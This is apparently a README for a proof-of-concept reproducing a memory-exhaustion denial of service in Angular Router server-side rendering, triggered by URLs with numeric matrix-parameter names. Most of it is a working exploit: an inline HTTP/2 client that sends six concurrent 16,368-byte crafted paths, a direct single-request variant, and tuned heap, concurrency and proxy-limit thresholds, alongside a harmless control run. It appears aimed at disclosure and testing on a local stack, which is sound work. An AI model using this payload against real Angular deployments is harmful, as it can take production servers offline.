# Angular Router numeric matrix-parameter OOM

Minimal reproduction of an Angular Router out-of-memory failure during server-side rendering (SSR).

```text
Candidate: /a;990;2522   numeric matrix-parameter names
Control:   /a;aaa;bbbb   normal string names
```

Both paths have the same size. Under concurrent SSR requests, the candidate exhausts the V8 heap while the control remains healthy.

A segment like `a;990;2522` becomes `{ "990": "", "2522": "" }`. V8 treats integer-like keys as array indices and backs the object with a dense elements store, so each one costs 30,485 bytes instead of the 68 bytes the control needs.

Nginx 1.31.5 uses a small production-like reverse-proxy configuration:

- HTTP/2 from the client and HTTP/1.1 keepalive to Angular.
- Standard forwarded headers and proxy timeouts.
- Health checks before requests start.
- `large_client_header_buffers 4 16k`, matching the AWS Elastic Load Balancer request line.
- A 16,368-byte request path, just below the 16 KiB request-line limit.

Nginx terminates the client HTTP/2 connection and uses separate HTTP/1.1 keepalive connections to Angular. This is normal reverse-proxy behavior, not a protocol fallback. The local test uses cleartext HTTP/2 (`h2c`); public deployments normally terminate HTTP/2 over TLS.

Angular runs with `--max-http-header-size=32768`. The stock 16,384 stops the URI at 16,346 bytes and answers `431`, 22 bytes short of the test path. Node sets no upper bound of its own, so the ceiling always comes from the proxy.

## Automated test

The validator starts fresh containers, runs the control, triggers the candidate OOM, and confirms Docker did not kill the container:

```bash
./scripts/validate.sh 256
./scripts/validate.sh 512
```

Evidence is written to `evidence/run-256/` and `evidence/run-512/`.

Optional fast V8-only check:

```bash
node scripts/check-v8.mjs all
```

## Manual HTTP/2 test

The candidate intentionally crashes the SSR worker. Use only this disposable local stack.

Start Angular SSR with a 256 MiB V8 old-space limit and Nginx:

```bash
HEAP_MB=256 docker compose up -d --build --wait app nginx
```

From Bash on Windows, send the candidate workload through Nginx's exposed port:

```bash
HEAP_MB=256 TARGET_URL=http://127.0.0.1:8080 node client/send.mjs
```

Equivalent inline client, with no project script execution:

```bash
node --input-type=module -e '
import http2 from "node:http2";

const client = http2.connect("http://127.0.0.1:8080");
client.on("error", () => {});

const path = "/a;990;2522".repeat(1488);

await Promise.all(
  Array.from({ length: 6 }, () =>
    new Promise((done) => {
      const request = client.request({ ":path": path });
      request.on("response", () => request.resume());
      request.on("end", done);
      request.on("error", done);
      request.end();
    }),
  ),
);

client.close();
'
```

This sends 6 concurrent 16,368-byte requests over one HTTP/2 connection. Confirm the V8 failure:

```bash
docker compose logs app | grep -E 'Reached heap limit|JavaScript heap out of memory'
docker inspect "$(docker compose ps -a -q app)" --format '{{.State.OOMKilled}}'
```

Expected: a V8 heap error and `false`. `false` proves the kernel did not kill the container.

Both profiles reached the V8 OOM in 3/3 fresh runs with Windows Node.js 24.16.0 and the 1,000 ms resolver.

To run the harmless control:

```bash
docker compose up -d --wait app nginx
HEAP_MB=256 docker compose run --rm --build control
```

Expected: `6/6` HTTP 200 responses and Angular remains healthy.

## Without a proxy

`client/direct.mjs` reaches Angular on the Compose network, so only Node's own limit applies and the request line can be as large as `--max-http-header-size` allows. One request is then enough:

```bash
HEAP_MB=512 MAX_HTTP_HEADER_SIZE=2097152 docker compose up -d --wait app
MAX_HTTP_HEADER_SIZE=2097152 docker compose run --rm -e SEGMENTS=95321 -e CONCURRENCY=1 direct
```

Docker reported `OOMKilled=false` in every run below, so these are V8 heap-limit failures.

| V8 old space | URI size    | Requests | V8 OOM |
| -----------: | ----------: | -------: | ------ |
|      512 MiB |    32,725 B |        1 | no     |
|      512 MiB | 1,048,531 B |        1 | yes    |
|     1024 MiB | 1,048,531 B |        1 | yes    |
|     2048 MiB | 2,097,062 B |        1 | yes    |

## Workloads

| V8 old space | HTTP/2 connections | Concurrent requests | Segments/request | Path size |
| -----------: | -----------------: | ------------------: | ---------------: | --------: |
|      256 MiB |                  1 |                   6 |            1,488 |  16,368 B |
|      512 MiB |                  1 |                  12 |            1,488 |  16,368 B |

Each request is held for `RESOLVER_HOLD_MS`, 1,000 ms by default, by the reproduction's route resolver. The hold is what makes requests overlap: at 500 ms the 512 MiB profile never fails, not even at 128 concurrent requests, because parsing is CPU-bound and the requests serialize instead. Spreading the same requests over separate HTTP/2 connections changes nothing.

The thresholds are 4 requests at 256 MiB and 10 at 512 MiB; the workloads above keep a margin.

## Clean up

```bash
docker compose down -v --remove-orphans
```

Only Nginx is exposed, at `127.0.0.1:8080`. Angular remains inside the Compose network.
